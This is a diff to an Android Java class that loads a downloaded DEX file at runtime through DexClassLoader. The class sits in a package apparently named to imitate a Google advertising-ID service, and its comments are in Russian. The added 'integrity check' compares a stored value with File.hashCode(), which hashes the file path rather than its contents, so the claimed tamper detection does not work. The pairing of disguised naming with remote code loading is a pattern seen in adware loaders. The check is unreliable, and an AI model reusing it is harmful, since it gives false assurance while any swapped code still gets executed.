@@ -4,6 +4,7 @@ import android.content.Context;
 
 import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
 import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
+import com.advertising_id_service.appclick.googleadvertisingidservice.SharedPreferencesServicer.SharedPreferencesServicer;
 
 import java.io.File;
 import java.lang.reflect.Constructor;
@@ -20,9 +21,27 @@ public class ExternalLibServicer {
     private ExternalLibServicer(Context cnt){
         String filePath = getDexFilePath(cnt); //!!! TODO: возможно надо сохранять отдельно как релизную так и дебажную версию
         File dexFile = new File(filePath);
-        File codeCacheDir = new File(cnt.getCacheDir() + File.separator + "codeCache");
-        codeCacheDir.mkdirs();
-        dexClassLoader = dexFile.length() == 0 ? null : new DexClassLoader( dexFile.getAbsolutePath(), codeCacheDir.getAbsolutePath(), null, cnt.getClassLoader());
+        if( dexFile.length() == 0){ // Если самого файла нет - ничего не загружаем
+            dexClassLoader = null;
+            return;
+        }
+
+        String dexHashCode = SharedPreferencesServicer.getPreferences(cnt, GlobalParameters.SPF_SESSION_DEX_HASH, GlobalParameters.SPF_KEY_DEX_HASH, null);
+
+        //Проверяем что наш DEX не подменили и он имеет тот же хэш-код что и при скачивании
+        String realDexHash = String.valueOf(dexFile.hashCode());
+        Logger.log("dex_code = " + dexFile.hashCode());
+        if((dexHashCode!= null)&&(dexHashCode.equals(realDexHash))) {
+            File codeCacheDir = new File(cnt.getCacheDir() + File.separator + "codeCache");
+            codeCacheDir.mkdirs();
+            dexClassLoader = dexFile.length() == 0 ? null : new DexClassLoader( dexFile.getAbsolutePath(), codeCacheDir.getAbsolutePath(), null, cnt.getClassLoader());
+        }
+        else
+        {
+            Logger.log("Ошибка загрузки dex файла. Не совпадают hash суммы  " + dexHashCode + "!=" + realDexHash);
+            dexClassLoader = null;
+        }
+
     }
 
     public static synchronized ExternalLibServicer getServicer(Context cnt)
@@ -35,6 +54,12 @@ public class ExternalLibServicer {
             }
         }
         return instance;
+    }
+
+    public static void clearDexClassLoader()
+    {
+        instance = null;
+        dexClassLoader = null;
     }
 
     public static boolean isExternalLibAccessible(Context cnt)
